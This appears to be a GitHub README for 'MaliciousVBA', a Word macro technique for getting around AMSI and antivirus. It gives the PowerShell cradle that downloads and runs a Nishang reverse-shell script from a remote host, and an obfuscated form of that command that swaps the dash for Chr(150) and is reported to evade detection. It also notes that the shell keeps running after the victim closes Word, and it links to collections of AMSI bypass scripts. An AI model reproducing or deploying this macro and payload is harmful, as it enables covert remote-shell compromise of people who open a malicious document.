# MaliciousVBA

I was reading various articles on how other go about bypassing AMSI using VBA. A great article can be found on this blog [codewhitesec](https://codewhitesec.blogspot.com/2019/07/heap-based-amsi-bypass-in-vba.html).

Instead of trying to replicate that I chose a different route. I tried using the powershell command Invoke-Experession to download [Nikhil's](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) reverse shell script.


## Running Powershell in VBA

In order to run powershell commands using VBA I have used the code published in Microsoft's Docs [here](https://docs.microsoft.com/en-us/office/vba/access/concepts/windows-api/determine-when-a-shelled-process-ends). The code is ideal for this project because it doesn't get flagged by the Antivirus or AMSI. It also spawns a seperate process. That's particularly helpful since our script won't be terminated if the victim closes Word. 

## Powershell Command 
The command I wanted to run in this macro is the following:

```sh
Powershell.exe -WindowStyle Hidden IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.246/1234567892222.ps1')
```
This command was flagged by AMSI as malicious. After experimenting a bit with variations of this command i found out that the AMSI was flagging -WindowStyle as malicious. Splitting the string using conventional amsi bypassing techinques ("-W" + "indo" + "wStyle") was not effective. Instead I started replacing the '-' symbol with ascii character codes of the various "-" symbols. Finally Chr(150) did the trick and my reverse shell script was executed. 

The final form of the powershell command was:
```sh
Chr(112) + "ower" + "shell.exe " + Chr(150) + "WindowStyle Hidden" + "  IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.246/1234567892222.ps1')"
```
## Powershell script (Invoke-PowerShellTcp)
I have slightly modified [Nikhil's](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) script in order to avoid being detected by AMSI for powershell. Once connection is established an amsi bypass script can be used.[Here is a list of AMSI bypass scripts that can be used by S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
